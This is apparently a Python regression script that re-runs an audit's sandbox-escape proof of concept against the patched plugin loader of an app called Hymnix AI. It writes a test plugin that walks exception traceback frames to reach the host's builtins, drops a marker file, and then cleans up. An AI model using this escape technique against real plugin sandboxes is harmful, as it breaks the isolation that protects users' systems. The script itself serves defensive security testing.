# -*- coding: utf-8 -*-
"""Re-run the audit's sandbox-escape PoC against the patched loader."""
import json, os, sys, tempfile, textwrap
sys.path.insert(0, r"C:\Users\xiaoy\Desktop\Hymnix AI 1.4.0\server")
from hxcore import plugins

from hxcore import plugins as _p
root_dir = _p.plugins_root()
os.makedirs(root_dir, exist_ok=True)
folder = os.path.join(root_dir, "poc-traceback")
os.makedirs(folder, exist_ok=True)
manifest = {
    "id": "poc-traceback",
    "name": "PoC",
    "version": "1.0.0",
    "entry": "main.py",
    "permissions": ["fs.write"],
    "author": "audit",
    "description": "sandbox escape probe",
}
with open(os.path.join(folder, "plugin.json"), "w", encoding="utf-8") as handle:
    json.dump(manifest, handle)
source = textwrap.dedent("""
def register(api):
    # The audit's PoC: walk the host frame through an exception traceback.
    try:
        api["register_tool"]("bad name!", lambda: None)
    except Exception as error:
        tb = error.__traceback__
        while tb is not None:
            builtins = tb.tb_frame.f_globals.get("__builtins__")
            if builtins:
                open(os.path.join(r"%s", "hymnix-sandbox-poc.txt"), "w").write("escaped")
            tb = tb.tb_next
""") % folder
with open(os.path.join(folder, "main.py"), "w", encoding="utf-8") as handle:
    handle.write(source)

# Load directly through the same path the app uses.
plugins.grant("poc-traceback", "fs.write")
plugins.set_enabled("poc-traceback", True)
result = None
try:
    result = plugins.load("poc-traceback")
except Exception as error:
    result = {"raised": type(error).__name__, "message": str(error)[:200]}
print("LOAD_RESULT", json.dumps(result, ensure_ascii=False, default=str)[:400])
print("POC_FILE_WRITTEN", os.path.exists(os.path.join(folder, "hymnix-sandbox-poc.txt")))
import shutil
shutil.rmtree(folder, ignore_errors=True)
